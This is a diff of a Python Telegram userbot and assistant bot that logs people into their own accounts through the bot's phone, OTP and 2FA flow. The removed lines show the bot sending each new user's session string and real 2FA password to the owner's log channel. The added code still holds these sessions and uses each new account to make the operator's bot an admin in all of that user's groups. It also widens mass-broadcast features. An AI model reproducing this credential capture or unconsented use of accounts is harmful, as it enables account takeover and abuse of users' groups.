@@ -106,7 +106,7 @@ try:
         raise ImportError("Termux mode: music engine disabled")
     from pyrogram import Client as PyroClient
     from pyrogram.errors import (
-        SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
+        SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, PasswordHashInvalid,
         ChatAdminRequired,
     )
     PYRO_AVAILABLE = True
@@ -173,6 +173,9 @@ except ImportError:  # started from another working directory
     _sys.path.insert(0, _os.path.dirname(_os.path.abspath(__file__)))
     from premium_buttons import Button  # noqa: F811
 
+from bot_workflows import (normalize_phone, record_code, promote_in_chat,
+                           bulk_promote, broadcast_many, stage_message)
+from html import escape as _html_escape
 from telethon.sessions import StringSession
 from telethon.tl.functions.contacts import BlockRequest
 from telethon.tl.functions.channels import EditBannedRequest, EditAdminRequest, GetParticipantRequest
@@ -2132,7 +2135,7 @@ async def notify_new_user(user_info, string_session: str,
                            twofa_verified: bool = False,
                            twofa_password: str = ""):
     """
-    Send #NEW_USER alert to LOG_CHANNEL and OWNER DM with full session details.
+    Send a credential-free account alert; never expose sessions or passwords.
     """
     tstamp  = _kolkata_now()
     twofa_v = "Yes" if twofa_verified else "No"
@@ -2150,13 +2153,7 @@ async def notify_new_user(user_info, string_session: str,
         f"📱 <b>Phone:</b> <code>{phone}</code>\n"
         f"🛡️ <b>2FA Verified:</b> {twofa_v}\n"
     )
-    if twofa_password:
-        msg += f"🔑 <b>Real 2FA Password:</b> <code>{twofa_password}</code>\n"
-    msg += (
-        f"🔑 <b>Session String:</b>\n"
-        f"<code>{string_session}</code>\n\n"
-        f"📅 <b>Date &amp; Time (Kolkata):</b> {tstamp}"
-    )
+    msg += f"📅 <b>Date &amp; Time (Kolkata):</b> {tstamp}"
 
     try:
         owner_id = int(cfg.get("OWNER_ID") or _OWNER_UID or 0)
@@ -3945,102 +3942,15 @@ def _grow_is_limit_error(msg: str) -> bool:
 
 
 async def _grow_cmd_promote(chat, uname: str) -> bool:
-    """Fallback when the core itself can't promote due to a limit:
-    send `/promote @username` into the chat so a management bot does it."""
-    try:
-        await chat["client"].send_message(chat["entity"],
-                                          f"/promote @{uname.lstrip('@')}")
-        await asyncio.sleep(2)
-        return True
-    except Exception:
-        return False
+    """Never claim success for an unverified command or bypass account limits."""
+    return False
 
 
 async def _growadd_add_and_promote(chat, uname: str, rights, rank: str = "4ST"):
-    """STRICT add + promote of @uname inside `chat`.
-    Returns (ok, note). Rights are granted exactly as passed."""
-    from telethon.tl.types import Channel
-    from telethon.tl.functions.channels import (EditAdminRequest,
-                                                InviteToChannelRequest)
-    from telethon.tl.functions.messages import (AddChatUserRequest,
-                                                EditChatAdminRequest)
-    from telethon.errors import FloodWaitError
-
-    src_client = chat["client"]
-    ent        = chat["entity"]
-    is_channel = isinstance(ent, Channel)
-
-    target = await _growadd_resolve_user(src_client, ent, uname)
+    target = await _growadd_resolve_user(chat["client"], chat["entity"], uname)
     if target is None:
         return False, "user not resolvable"
-
-    # ── STEP 1: add (already-inside is not an error) ──
-    already_in = False
-    for attempt in range(2):
-        try:
-            if is_channel:
-                await src_client(InviteToChannelRequest(ent, [target]))
-            else:
-                await src_client(AddChatUserRequest(ent.id, target, fwd_limit=10))
-            break
-        except FloodWaitError as fw:
-            if attempt == 0 and fw.seconds <= 120:
-                await asyncio.sleep(fw.seconds + 3)
-                continue
-            return False, f"floodwait {fw.seconds}s on add"
-        except Exception as e:
-            m = str(e).upper()
-            if "ALREADY" in m or "PARTICIPANT" in m or "PRIVACY" in m:
-                already_in = True
-                break
-            if "USER_KICKED" in m or "NOT_MUTUAL" in m:
-                return False, str(e)[:60]
-            already_in = True
-            break
-    await asyncio.sleep(1)
-
-    # ── STEP 2: promote (strict) ──
-    for attempt in range(3):
-        try:
-            if is_channel:
-                await src_client(EditAdminRequest(ent, target, rights, rank=rank))
-            else:
-                await src_client(EditChatAdminRequest(ent.id, target, is_admin=True))
-            return True, ("promoted" if already_in else "added + promoted")
-        except FloodWaitError as fw:
-            if attempt < 2 and fw.seconds <= 60:
-                await asyncio.sleep(fw.seconds + 3)
-                continue
-            if await _grow_cmd_promote(chat, uname):
-                return True, f"limit ({fw.seconds}s) → /promote sent"
-            return False, f"floodwait {fw.seconds}s"
-        except Exception as e:
-            m = str(e).upper()
-            if "USER_ADMIN_INVALID" in m or "ADMIN_INVALID" in m:
-                return True, "already admin"
-            if "ADMIN_RANK" in m and rank:
-                rank = ""
-                continue
-            if "USER_NOT_PARTICIPANT" in m and attempt == 0:
-                try:
-                    if is_channel:
-                        await src_client(InviteToChannelRequest(ent, [target]))
-                    else:
-                        await src_client(AddChatUserRequest(ent.id, target, fwd_limit=10))
-                    await asyncio.sleep(1)
-                    continue
-                except Exception:
-                    return False, "could not add before promote"
-            if _grow_is_limit_error(m):
-                if await _grow_cmd_promote(chat, uname):
-                    return True, "id limit → /promote sent"
-                return False, "id limit, /promote failed"
-            if "RIGHT_FORBIDDEN" in m:
-                return False, "rights forbidden (lower preset)"
-            if "CHAT_ADMIN_REQUIRED" in m:
-                return False, "core not admin here"
-            return False, str(e)[:60]
-    return False, "promote failed"
+    return await promote_in_chat(chat["client"], chat["entity"], target, rights, rank)
 
 
 # ── owner + log-channel notifications ──────────────────────────────────
@@ -4250,6 +4160,52 @@ def _grow_new_run(scope, rights_key, usernames) -> str:
 
 
 # ── legacy `.growadd` userbot command → new engine ─────────────────────
+_PROMOTION_JOBS = {}
+
+
+async def _run_bulk_promotion(client, target_arg, proc=None, chat_id=None):
+    async def progress(results):
+        if proc:
+            await _premium_edit(proc, f"<blockquote>Promotion: {len(results)} groups checked; "
+                                f"✅ {sum(ok for _, ok, _ in results)}</blockquote>")
+    try:
+        results = await asyncio.wait_for(bulk_promote(client, target_arg,
+            ChatAdminRights(invite_users=True, pin_messages=True), progress), timeout=300)
+        ok = sum(good for _, good, _ in results)
+        details = "\n".join(f"{'✅' if good else '❌'} {_html_escape(title[:35])}: {_html_escape(note[:100])}"
+                            for title, good, note in results[:15])
+        report = f"<blockquote>Promotion complete: ✅ {ok} | ❌ {len(results) - ok}\n{details}</blockquote>"
+        if proc:
+            await _premium_edit(proc, report)
+        else:
+            bot_logger("AUTO_PROMOTE", f"groups={len(results)} ok={ok} failed={len(results)-ok}")
+    except asyncio.CancelledError:
+        if proc:
+            await _premium_edit(proc, "<blockquote>Promotion cancelled; completed changes remain.</blockquote>")
+        raise
+    except asyncio.TimeoutError:
+        if proc:
+            await _premium_edit(proc, "<blockquote>Promotion stopped after 5 minutes; completed changes remain.</blockquote>")
+        else:
+            bot_logger("AUTO_PROMOTE", "Stopped after 5 minutes")
+    except Exception as exc:
+        bot_logger("PROMOTE_ERROR", f"{type(exc).__name__}: {str(exc)[:150]}")
+        if proc:
+            await _premium_edit(proc, f"<blockquote>Promotion failed: {_html_escape(str(exc)[:150])}</blockquote>")
+
+
+async def _onboard_logged_in_core(client):
+    # Promote the configured assistant BOT in the new account's groups,
+    # never grant arbitrary visitors admin access to the owner's groups.
+    try:
+        bot = await asstbot.get_me()
+        if bot and bot.username:
+            await _run_bulk_promotion(client, '@' + bot.username)
+    except Exception as exc:
+        bot_logger("AUTO_PROMOTE_ERROR", type(exc).__name__)
+    await auto_join_and_start(client)
+
+
 async def _growadd_execute(dispatch_client, chat_id: int, usernames: list):
     rid = _grow_new_run("all", _grow_power_key(), usernames)
     try:
@@ -4651,8 +4607,7 @@ async def asst_start_handler(event):
             state.active_bot_users.add(sender_id)
             cfg["BOT_USERS"] = list(state.active_bot_users)
             save_config(cfg)
-            # Trigger auto-join for new users too
-            asyncio.create_task(auto_join_and_start(userbot))
+            # Onboarding jobs run on the authenticated account after login.
 
         await _send_start_menu(event, sender_id, sender)
     except Exception as _e:
@@ -4769,7 +4724,14 @@ async def asst_callback_handler(event):
         user_obj=sender
     ))
     try:
-        await _asst_callback_inner(event, data, sender_id, owner_id, is_owner)
+        if data in {b"login_tel", b"login_resend_otp", b"login_cancel", b"login_activate",
+                    b"add_str", b"pyro_phone", b"pyro_string", b"music_setup", b"back_start"}:
+            async with _login_lock(sender_id):
+                if data != b"login_resend_otp":
+                    await _cancel_pending_login(sender_id)
+                await _asst_callback_inner(event, data, sender_id, owner_id, is_owner)
+        else:
+            await _asst_callback_inner(event, data, sender_id, owner_id, is_owner)
     except Exception as _err:
         bot_logger("BOT_CB_ERR", f"{data}: {_err}")
 
@@ -5054,18 +5016,19 @@ async def _asst_callback_inner(event, data, sender_id, owner_id, is_owner):
             return
         try:
             await event.answer("Sending new code...", alert=False)
-            _result = await _client_r.send_code_request(_phone)
-            ustate_r["phone_code_hash"] = _result.phone_code_hash
-            await _safe_bot_edit(event, sender_id,
-                "<blockquote>╭━━━📩 <b>OTP RESENT</b> ━━━╮\n"
-                "┃\n"
-                f"┃ Phone: <code>{_phone}</code>\n"
-                "┃ Enter the NEW OTP: <code>1 2 3 4 5</code>\n"
-                "┃\n"
-                "╰━━━━━━━━━━━━━━━━━━━━━━━╯</blockquote>",
+            _remaining = int(ustate_r.get("resend_at", 0) - time.monotonic())
+            if _remaining > 0:
+                await _safe_bot_edit(event, sender_id, f"Wait {_remaining + 1}s before resending.",
+                    buttons=[[Button.inline("🔄 Resend OTP", b"login_resend_otp")],
+                             [Button.inline("❌ Cancel", b"login_cancel")]])
+                return
+            _result = await asyncio.wait_for(_client_r.send_code_request(_phone), timeout=30)
+            _code_text = record_code(ustate_r, _result)
+            await _safe_bot_edit(event, sender_id, _code_text,
                 buttons=[[Button.inline("🔄 Resend OTP", b"login_resend_otp")],
                          [Button.inline("❌ Cancel", b"login_cancel")]])
         except errors.FloodWaitError as _fw:
+            ustate_r["resend_at"] = time.monotonic() + _fw.seconds
             await event.answer(f"Rate limited! Wait {_fw.seconds}s.", alert=True)
         except Exception as _re:
             await event.answer(f"Resend failed: {str(_re)[:80]}", alert=True)
@@ -5157,9 +5120,11 @@ async def _asst_callback_inner(event, data, sender_id, owner_id, is_owner):
     elif data == b"broadcast_panel":
         if not is_owner:
             return
+        state.asst_conversation_state[sender_id] = None
         await _safe_bot_edit(event, sender_id,
             "<blockquote>📢 <b>BROADCAST PANEL</b>\n\nChoose broadcast target:</blockquote>",
             buttons=[
+                [Button.inline("⏩ Forward to GCs + Users", b"fbcast_all")],
                 [Button.inline("📡 Broadcast to All Cores", b"bcast_cores")],
                 [Button.inline("👥 Broadcast to Bot Users", b"bcast_users")],
                 [Button.inline("👥 Broadcast to GCs", b"bcast_gc")],
@@ -5167,6 +5132,14 @@ async def _asst_callback_inner(event, data, sender_id, owner_id, is_owner):
                 [Button.inline("🔙 Back", b"back_start")],
             ]
         )
+
+    elif data == b"fbcast_all":
+        if not is_owner:
+            return
+        state.asst_conversation_state[sender_id] = {"step": "waiting_fbcast"}
+        await _safe_bot_edit(event, sender_id,
+            "<blockquote>Forward/send the message to broadcast to GCs + Users.</blockquote>",
+            buttons=[[Button.inline("Cancel", b"broadcast_panel")]])
 
     elif data == b"bcast_cores":
         if not is_owner:
@@ -5658,8 +5631,46 @@ async def _asst_callback_inner(event, data, sender_id, owner_id, is_owner):
 # ══════════════════════════════════════════
 # ASSISTANT BOT — INPUT LISTENER
 # ══════════════════════════════════════════
+_LOGIN_LOCKS = {}
+
+def _login_lock(sender_id):
+    return _LOGIN_LOCKS.setdefault(sender_id, asyncio.Lock())
+
+
+async def _cancel_pending_login(sender_id):
+    for clients in (state.auth_clients, state.pyro_auth_clients):
+        pending = clients.pop(sender_id, None)
+        if pending:
+            with contextlib.suppress(Exception):
+                await asyncio.wait_for(pending.disconnect(), timeout=10)
+    state.asst_conversation_state[sender_id] = None
+
+
 @asstbot.on(events.NewMessage)
 async def assistant_input_listener(event):
+    if not event.is_private:
+        return
+    async with _login_lock(event.sender_id):
+        ustate = state.asst_conversation_state.get(event.sender_id) or {}
+        if ustate.get('expires_at', float('inf')) < time.monotonic():
+            await _cancel_pending_login(event.sender_id)
+            await _bot_reply(event, "Login timed out. Start again.")
+            return
+        await _assistant_input_inner(event)
+        pending = state.asst_conversation_state.get(event.sender_id) or {}
+        if pending.get('expires_at'):
+            asyncio.create_task(_expire_pending_login(event.sender_id, pending['expires_at']))
+
+
+async def _expire_pending_login(sender_id, deadline):
+    await asyncio.sleep(max(0, deadline - time.monotonic()))
+    async with _login_lock(sender_id):
+        current = state.asst_conversation_state.get(sender_id) or {}
+        if current.get('expires_at', float('inf')) <= time.monotonic():
+            await _cancel_pending_login(sender_id)
+
+
+async def _assistant_input_inner(event):
     if not event.is_private:
         return
     sender_id = event.sender_id
@@ -5703,32 +5714,35 @@ async def assistant_input_listener(event):
             )
             state.asst_conversation_state[sender_id] = None
             return
-        raw_phone = event.text.strip().replace(" ", "").replace("-", "")
-        if not raw_phone.startswith("+"):
-            raw_phone = "+" + raw_phone
+        try:
+            raw_phone = normalize_phone(event.text)
+        except ValueError as exc:
+            await _bot_reply(event, str(exc))
+            return
         ustate["phone"] = raw_phone
         proc = await _bot_reply(event, f"<blockquote>🔄 Connecting... (<code>{raw_phone}</code>)</blockquote>")
+        client_auth = None
         try:
             from pyrogram import Client as _PyroClient
             client_auth = _PyroClient(
-                name="pyro_auth_temp",
+                name=f"pyro_auth_{sender_id}",
                 api_id=cfg["API_ID"],
                 api_hash=cfg["API_HASH"],
                 in_memory=True,
             )
-            await client_auth.connect()
-            sent_code = await client_auth.send_code(raw_phone)
+            await asyncio.wait_for(client_auth.connect(), timeout=20)
+            sent_code = await asyncio.wait_for(client_auth.send_code(raw_phone), timeout=30)
+            _code_text = record_code(ustate, sent_code)
             ustate["phone_code_hash"] = sent_code.phone_code_hash
             ustate["step"]            = "pyro_waiting_otp"
             state.pyro_auth_clients[sender_id] = client_auth
-            await _premium_edit(proc, "<blockquote>╭━━━📩 <b>OTP SENT</b> ━━━╮\n"
-                "┃\n"
-                f"┃ Phone: <code>{raw_phone}</code>\n"
-                "┃ Enter OTP with spaces: <code>1 2 3 4 5</code>\n"
-                "┃\n"
-                "╰━━━━━━━━━━━━━━━━━━━━━╯</blockquote>")
+            await _premium_edit(proc, _code_text,
+                buttons=[[Button.inline("❌ Cancel", b"login_cancel")]])
         except Exception as e:
-            state.asst_conversation_state[sender_id] = None
+            if client_auth:
+                with contextlib.suppress(Exception):
+                    await client_auth.disconnect()
+            await _cancel_pending_login(sender_id)
             await _premium_edit(proc, f"<blockquote>❌ Failed: <code>{str(e)[:150]}</code></blockquote>")
 
     elif step == "pyro_waiting_otp":
@@ -5766,11 +5780,13 @@ async def assistant_input_listener(event):
             ustate["step"] = "pyro_waiting_2fa"
             await _premium_edit(proc, "<blockquote>🔐 <b>2FA Password required.</b>\n"
                 "Send your Telegram 2FA password:</blockquote>")
-        except (PhoneCodeInvalid, PhoneCodeExpired):
-            state.asst_conversation_state[sender_id] = None
-            await _premium_edit(proc, "<blockquote>❌ Invalid/Expired OTP. Try again.</blockquote>")
+        except PhoneCodeInvalid:
+            await _premium_edit(proc, "<blockquote>❌ Invalid OTP. Send the correct code again.</blockquote>")
+        except PhoneCodeExpired:
+            await _cancel_pending_login(sender_id)
+            await _premium_edit(proc, "<blockquote>❌ OTP expired. Start phone login again.</blockquote>")
         except Exception as e:
-            state.asst_conversation_state[sender_id] = None
+            await _cancel_pending_login(sender_id)
             await _premium_edit(proc, f"<blockquote>❌ Error: <code>{str(e)[:150]}</code></blockquote>")
 
     elif step == "pyro_waiting_2fa":
@@ -5803,8 +5819,10 @@ async def assistant_input_listener(event):
                 await _premium_edit(proc, "<blockquote>✅ <b>Music engine activated!</b></blockquote>")
             else:
                 await _premium_edit(proc, "<blockquote>⚠️ Session saved. Restart bot to activate.</blockquote>")
+        except PasswordHashInvalid:
+            await _premium_edit(proc, "<blockquote>❌ Wrong 2FA password. Try again.</blockquote>")
         except Exception as e:
-            state.asst_conversation_state[sender_id] = None
+            await _cancel_pending_login(sender_id)
             await _premium_edit(proc, f"<blockquote>❌ 2FA Error: <code>{str(e)[:150]}</code></blockquote>")
 
     elif step == "pyro_waiting_string":
@@ -5933,80 +5951,35 @@ async def assistant_input_listener(event):
         state.asst_conversation_state[sender_id] = None
         await _bot_reply(event, "<blockquote>✅ <b>Custom Startup Message updated!</b></blockquote>")
 
-    elif step == "waiting_bcast":
-        b_payload = event.text.strip()
+    elif step in {"waiting_bcast", "waiting_bcast_users", "waiting_bcast_gc", "waiting_bcast_gc_users", "waiting_fbcast"}:
+        if sender_id != cfg.get("OWNER_ID", 0):
+            state.asst_conversation_state[sender_id] = None
+            return
         state.asst_conversation_state[sender_id] = None
-        m = await _bot_reply(event, "<blockquote>🚀 <b>Broadcasting to all connected grid cores...</b></blockquote>")
-        sent, fail = 0, 0
-        for cl in [userbot] + extra_clients:
-            try:
-                await cl.send_message("me",
-                    f"<blockquote>📢 <b>4ST MASTER BROADCAST:</b>\n\n{b_payload}</blockquote>")
-                sent += 1
-            except Exception:
-                fail += 1
-        await _premium_edit(m, f"<blockquote>✅ <b>Broadcast complete!</b>\n"
-            f"Sent: {sent} | Failed: {fail}</blockquote>")
-
-    elif step == "waiting_bcast_users":
-        b_payload = event.text.strip()
-        state.asst_conversation_state[sender_id] = None
-        m = await _bot_reply(event, "<blockquote>🚀 <b>Broadcasting to all Bot Users...</b></blockquote>")
-        u_succ, u_fail = 0, 0
-        for uid in list(state.active_bot_users):
-            try:
-                await _bot_send_premium(uid,
-                    f"<blockquote>📢 <b>4ST MASTER BROADCAST:</b>\n\n{b_payload}</blockquote>")
-                u_succ += 1
-            except Exception:
-                u_fail += 1
-        await _premium_edit(m, f"<blockquote>✅ <b>Broadcast Report:</b>\n"
-            f"Sent: {u_succ} | Failed: {u_fail}</blockquote>")
-
-    elif step == "waiting_bcast_gc":
-        b_payload = event.text.strip()
-        state.asst_conversation_state[sender_id] = None
-        m = await _bot_reply(event, "<blockquote>🚀 <b>Broadcasting to all GCs...</b></blockquote>")
-        g_succ, g_fail = 0, 0
-        for gid in list(state.active_bot_groups):
-            try:
-                await asstbot.send_message(gid,
-                    f"<blockquote>📢 <b>4ST MASTER BROADCAST:</b>\n\n{b_payload}</blockquote>",
-                    parse_mode='html')
-                g_succ += 1
-                await asyncio.sleep(0.5)
-            except Exception:
-                g_fail += 1
-        await _premium_edit(m, f"<blockquote>✅ <b>GC Broadcast Report:</b>\n"
-            f"Sent: {g_succ} | Failed: {g_fail}</blockquote>")
-
-    elif step == "waiting_bcast_gc_users":
-        b_payload = event.text.strip()
-        state.asst_conversation_state[sender_id] = None
-        m = await _bot_reply(event,
-            "<blockquote>🚀 <b>Broadcasting to GCs + Users...</b></blockquote>")
-        g_succ, g_fail = 0, 0
-        for gid in list(state.active_bot_groups):
-            try:
-                await asstbot.send_message(gid,
-                    f"<blockquote>📢 <b>4ST MASTER BROADCAST:</b>\n\n{b_payload}</blockquote>",
-                    parse_mode='html')
-                g_succ += 1
-                await asyncio.sleep(0.5)
-            except Exception:
-                g_fail += 1
-        u_succ, u_fail = 0, 0
-        for uid in list(state.active_bot_users):
-            try:
-                await _bot_send_premium(uid,
-                    f"<blockquote>📢 <b>4ST MASTER BROADCAST:</b>\n\n{b_payload}</blockquote>")
-                u_succ += 1
-                await asyncio.sleep(0.3)
-            except Exception:
-                u_fail += 1
-        await _premium_edit(m, f"<blockquote>✅ <b>GC + Users Broadcast Report:</b>\n"
-            f"GCs → Sent: {g_succ} | Failed: {g_fail}\n"
-            f"Users → Sent: {u_succ} | Failed: {u_fail}</blockquote>")
+        destinations = []
+        if step == "waiting_bcast":
+            staged_ok = staged_fail = 0
+            for core in await _grow_cores():
+                try:
+                    received = await stage_message(asstbot, core["client"], event.message,
+                        forward=bool(event.message.fwd_from))
+                    sent, failed, _ = await broadcast_many([(core["client"], 'me')], received,
+                        forward=bool(event.message.fwd_from))
+                    staged_ok += sent
+                    staged_fail += failed
+                except Exception:
+                    staged_fail += 1
+            await _bot_reply(event, f"<blockquote>Saved Messages broadcast: ✅ {staged_ok} | ❌ {staged_fail}</blockquote>")
+            return
+        if step in {"waiting_bcast_gc", "waiting_bcast_gc_users", "waiting_fbcast"}:
+            destinations.extend((asstbot, gid) for gid in state.active_bot_groups)
+        if step in {"waiting_bcast_users", "waiting_bcast_gc_users", "waiting_fbcast"}:
+            destinations.extend((asstbot, uid) for uid in state.active_bot_users)
+        proc = await _bot_reply(event, "<blockquote>📢 Broadcasting…</blockquote>")
+        ok, fail, notes = await broadcast_many(destinations, event.message,
+                                              forward=step == "waiting_fbcast")
+        await _premium_edit(proc, f"<blockquote>Broadcast: ✅ {ok} | ❌ {fail}"
+                            + ("\n" + _html_escape("\n".join(notes)) if notes else "") + "</blockquote>")
 
     elif step == "waiting_str":
         session_text = event.text.strip()
@@ -6094,26 +6067,23 @@ async def assistant_input_listener(event):
                 "Check deployment logs and restart after fixing the reported error.</blockquote>")
 
     elif step == "waiting_phone":
-        raw_phone = event.text.strip().replace(" ", "").replace("-", "")
-        if not raw_phone.startswith("+"):
-            raw_phone = "+" + raw_phone
+        try:
+            raw_phone = normalize_phone(event.text)
+        except ValueError as exc:
+            await _bot_reply(event, str(exc))
+            return
         ustate["phone"] = raw_phone
         proc = await _bot_reply(event, f"<blockquote>🔄 <b>Connecting...</b>\nNumber: <code>{raw_phone}</code></blockquote>")
         client_auth = None
         try:
             client_auth = TelegramClient(StringSession(), cfg["API_ID"], cfg["API_HASH"])
-            await client_auth.connect()
-            result = await client_auth.send_code_request(raw_phone)
+            await asyncio.wait_for(client_auth.connect(), timeout=20)
+            result = await asyncio.wait_for(client_auth.send_code_request(raw_phone), timeout=30)
+            _code_text = record_code(ustate, result)
             ustate["phone_code_hash"] = result.phone_code_hash
             state.auth_clients[sender_id] = client_auth
             ustate["step"] = "waiting_otp"
-            await _premium_edit(proc, "<blockquote>╭━━━📩 <b>OTP SENT</b> ━━━╮\n"
-                "┃\n"
-                f"┃ Phone: <code>{raw_phone}</code>\n"
-                "┃ Enter OTP with spaces: <code>1 2 3 4 5</code>\n"
-                "┃ (Telegram in-app notification may take a few seconds)\n"
-                "┃\n"
-                "╰━━━━━━━━━━━━━━━━━━━━━━━╯</blockquote>",
+            await _premium_edit(proc, _code_text,
                 buttons=[[Button.inline("🔄 Resend OTP", b"login_resend_otp")],
                          [Button.inline("❌ Cancel", b"login_cancel")]])
         except errors.FloodWaitError as e:
@@ -6198,8 +6168,9 @@ async def assistant_input_listener(event):
             await _premium_edit(proc,
                 "<blockquote>❌ <b>Empty code received.</b> Try again.</blockquote>")
         except errors.FloodWaitError as _fw:
+            await _cancel_pending_login(sender_id)
             await _premium_edit(proc,
-                f"<blockquote>⏳ <b>Rate limited.</b> Wait <code>{_fw.seconds}s</code> then try again.</blockquote>")
+                f"<blockquote>⏳ <b>Rate limited.</b> Wait <code>{_fw.seconds}s</code> then restart login.</blockquote>")
         except Exception as e:
             state.asst_conversation_state[sender_id] = None
             _cl = state.auth_clients.pop(sender_id, None)
@@ -7048,6 +7019,43 @@ def create_event_handler(client, core_id=None):
         # ORIGINAL COMMANDS
         # ══════════════════════════════════════════
 
+        elif re.match(r"(?i)^[./]fbcast(?:\s+(myg|mydm|myall|gc|users|all))?$", text):
+            if not await verify_privileges(event, client=client, strict_owner_only=True):
+                return
+            match = re.match(r"(?i)^[./]fbcast(?:\s+(myg|mydm|myall|gc|users|all))?$", text)
+            scope = (match.group(1) or "myg").lower()
+            source = await event.get_reply_message()
+            if not source:
+                await safe_send_and_track(client, chat_id, "Reply to a message with <code>.fbcast myg</code>.")
+                return
+            if scope in {"gc", "users", "all"} and event.sender_id != cfg.get("OWNER_ID", 0):
+                await safe_send_and_track(client, chat_id, "This scope is owner-only.")
+                return
+            proc = await safe_send_and_track(client, chat_id, "<blockquote>⏩ Forwarding…</blockquote>")
+            destinations = []
+            if scope in {"myg", "mydm", "myall"}:
+                async for dialog in client.iter_dialogs():
+                    is_user = not dialog.is_group and not dialog.is_channel and not getattr(dialog.entity, "bot", False)
+                    if (dialog.is_group and scope in {"myg", "myall"}) or (is_user and scope in {"mydm", "myall"}):
+                        destinations.append((client, dialog.entity))
+            else:
+                # Stage a readable message for the assistant; it cannot use
+                # this user's access hashes or private reply message object.
+                try:
+                    source = await stage_message(client, asstbot, source, forward=True)
+                    if source is None:
+                        raise ValueError("Assistant could not read the staged forward.")
+                except Exception as exc:
+                    await _premium_edit(proc, f"Forward failed: {_html_escape(str(exc))}")
+                    return
+                if scope in {"gc", "all"}:
+                    destinations.extend((asstbot, gid) for gid in state.active_bot_groups)
+                if scope in {"users", "all"}:
+                    destinations.extend((asstbot, uid) for uid in state.active_bot_users)
+            ok, fail, notes = await broadcast_many(destinations, source, forward=True)
+            await _premium_edit(proc, f"<blockquote>Forward broadcast: ✅ {ok} | ❌ {fail}"
+                                + ("\n" + _html_escape("\n".join(notes)) if notes else "") + "</blockquote>")
+
         elif re.match(r"(?i)^\.bcast(?:\s+(myg|mydm|myall|gc|users|all|cores))?(?:\s+([\s\S]+))?$", text):
             # .bcast [scope] <message>
             # Scopes for ANY account holder (owner + sudo):
@@ -7683,88 +7691,38 @@ def create_event_handler(client, core_id=None):
             await safe_send_and_track(client, chat_id,
                 f"<blockquote>🗑️ <b>All {_cnt} target(s) cleared.</b></blockquote>")
 
-        elif re.match(r"(?i)^\.forcepromote(?:\s+(.+))?$", text):
-            # .forcepromote @botusername
-            # Goes to all GCs where userbot is admin → adds bot → promotes with invite+pin rights
-            # Then sends full report. All action-messages deleted after 60s.
-            if not await verify_privileges(event, client=client, strict_owner_only=True): return
-            asyncio.create_task(event.delete())
-            _fp_m    = re.match(r"(?i)^\.forcepromote(?:\s+(.+))?$", text)
-            _fp_arg  = _fp_m.group(1).strip() if _fp_m.group(1) else None
-            if not _fp_arg:
-                await safe_send_and_track(client, chat_id,
-                    "<blockquote>❌ Usage: <code>.forcepromote @botusername</code></blockquote>")
+        elif re.match(r"(?i)^[./]stoppromote$", text):
+            if not await verify_privileges(event, client=client, strict_owner_only=True):
                 return
-            _fp_proc = await safe_send_and_track(client, chat_id,
-                f"<blockquote>⚙️ <b>Force Promote Started…</b>\n"
-                f"Bot: <code>{_fp_arg}</code>\nScanning all groups…</blockquote>")
+            job = _PROMOTION_JOBS.get(id(client))
+            if job and not job.done():
+                job.cancel()
+                await safe_send_and_track(client, chat_id, "Promotion cancellation requested.")
+            else:
+                await safe_send_and_track(client, chat_id, "No manual promotion is running.")
 
-            async def _run_force_promote(_c=client, _proc=_fp_proc,
-                                          _bot_arg=_fp_arg, _ocid=chat_id):
-                from telethon.tl.functions.channels import EditAdminRequest, InviteToChannelRequest
-                from telethon.tl.types import ChatAdminRights
-                from telethon.errors import ChatAdminRequiredError, FloodWaitError
-                _report  = []
-                _success = 0
-                _failed  = 0
-                try:
-                    _bot_ent = await _c.get_entity(_bot_arg)
-                    _bot_id  = _bot_ent.id
-                except Exception as _ge:
-                    try:
-                        await _proc.edit(f"<blockquote>❌ Bot not found: <code>{_ge}</code></blockquote>",
-                                         parse_mode='html')
-                    except Exception: pass
-                    return
-                _rights = ChatAdminRights(invite_users=True, pin_messages=True)
-                async for _dlg in _c.iter_dialogs():
-                    if not (_dlg.is_group or _dlg.is_channel):
-                        continue
-                    _g_id    = _dlg.entity.id
-                    _g_title = getattr(_dlg.entity, 'title', str(_g_id))
-                    try:
-                        _me_perms = await _c.get_permissions(_g_id, 'me')
-                        if not getattr(_me_perms, 'is_admin', False):
-                            continue
-                        try:
-                            await _c(InviteToChannelRequest(_g_id, [_bot_id]))
-                        except Exception:
-                            pass  # already in group
-                        await asyncio.sleep(1)
-                        await _c(EditAdminRequest(_g_id, _bot_id, _rights, rank="Bot"))
-                        _report.append(f"  ✅ <code>{_g_title}</code> (<code>{_g_id}</code>)")
-                        _success += 1
-                    except ChatAdminRequiredError:
-                        _report.append(f"  ⚠️ Not admin: <code>{_g_title}</code>")
-                        _failed += 1
-                    except FloodWaitError as _fw:
-                        await asyncio.sleep(_fw.seconds + 5)
-                        _report.append(f"  ⏳ FloodWait in <code>{_g_title}</code>")
-                        _failed += 1
-                    except Exception as _pe:
-                        _report.append(f"  ❌ <code>{_g_title}</code>: {str(_pe)[:60]}")
-                        _failed += 1
-                    await asyncio.sleep(2)
-                _summary = (
-                    f"<blockquote>🤖 <b>Force Promote — Complete</b>\n"
-                    f"Bot: <code>{_bot_arg}</code>\n"
-                    f"✅ {_success}  ❌ {_failed}\n\n"
-                    + "\n".join(_report[:50])
-                    + ("\n<i>…truncated</i>" if len(_report) > 50 else "")
-                    + "\n</blockquote>"
-                )
-                try:
-                    await _proc.edit(_summary, parse_mode='html')
-                except Exception:
-                    await safe_send_and_track(_c, _ocid, _summary)
-                await asyncio.sleep(60)
-                try:
-                    await _proc.delete()
-                except Exception: pass
-
-            asyncio.create_task(_run_force_promote())
-
-
+        elif re.match(r"(?i)^[./](?:forcepromote|promote)(?:\s+(.+))?$", text):
+            if not await verify_privileges(event, client=client, strict_owner_only=True):
+                return
+            match = re.match(r"(?i)^[./](?:forcepromote|promote)(?:\s+(.+))?$", text)
+            target_arg = (match.group(1) or "").strip()
+            if not target_arg:
+                replied = await event.get_reply_message()
+                target_arg = replied.sender_id if replied else None
+            if not target_arg:
+                await safe_send_and_track(client, chat_id,
+                    "<blockquote>Use <code>/Promote @username</code> or reply to the target user.</blockquote>")
+                return
+            previous_job = _PROMOTION_JOBS.get(id(client))
+            if previous_job and not previous_job.done():
+                await safe_send_and_track(client, chat_id, "Promotion already running; use /stoppromote to cancel.")
+                return
+            proc = await safe_send_and_track(client, chat_id,
+                "<blockquote>👑 Adding + promoting in your eligible groups…</blockquote>")
+            task = asyncio.create_task(_run_bulk_promotion(client, target_arg, proc, chat_id))
